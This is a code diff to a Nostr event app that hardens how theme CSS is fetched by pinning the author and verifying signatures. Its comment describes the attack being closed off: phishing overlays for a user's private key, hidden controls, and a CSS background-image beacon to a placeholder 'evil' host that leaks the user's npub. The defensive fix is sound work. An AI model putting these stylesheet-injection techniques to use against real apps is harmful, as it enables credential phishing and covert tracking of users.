@@ -11,8 +11,10 @@ import {
   hexToBytes,
   utf8ByteLength,
   MAX_THEME_CSS_BYTES,
+  pickLatest,
 } from "@nostrautica/protocol";
 import { fetchEvents } from "$lib/nostr/ndk.js";
+import { onlyVerified, onlyByAuthors } from "$lib/nostr/verify.js";
 import { publishMonotonic } from "$lib/nostr/monotonic.js";
 import { toOutcome, type PublishOutcome } from "$lib/nostr/publish-queue.js";
 import { loadEventKeys } from "./keystore.js";
@@ -37,7 +39,20 @@ export async function fetchEventTheme(ctx: EventContext): Promise<string | undef
     { kinds: [KIND_EVENT_THEME], authors: [pubkey], "#d": [identifier] },
     ctx.config.relays,
   );
-  const latest = events.sort((a, b) => (b.created_at ?? 0) - (a.created_at ?? 0))[0];
+  // Authority boundary: `authors` in the filter above is a REQUEST, not a
+  // guarantee — nothing stops a relay in the event's set from answering it with a
+  // validly-signed 31609 authored by any key it likes. This content is not data
+  // the app renders; theme-injector.ts puts it verbatim into a <style> element in
+  // <head>, so an unpinned read hands any one of the event's relays a stylesheet
+  // over the whole app shell: a fixed-position overlay that phishes for an nsec,
+  // `display:none` on the controls a reader needs to leave a room, relabelled
+  // buttons, or a `background-image: url(https://evil/…?npub=…)` beacon (the CSP's
+  // img-src allows any https origin). E_id is the ONLY valid author of a 31609,
+  // so pin it here the same way every other authority read does (see attendee.ts
+  // `fetchRoster`), and pick the winner with the §3.1 rule (created_at, then
+  // LOWEST id) rather than an ad-hoc sort that leaves same-second ties to
+  // arrival order.
+  const latest = pickLatest(onlyByAuthors(onlyVerified(events), [pubkey]));
   const css = latest?.content ?? "";
   const valid = css.trim() && utf8ByteLength(css) <= MAX_THEME_CSS_BYTES;
   // Write-through: cache the CSS (or "" for "no theme") so the next entry paints
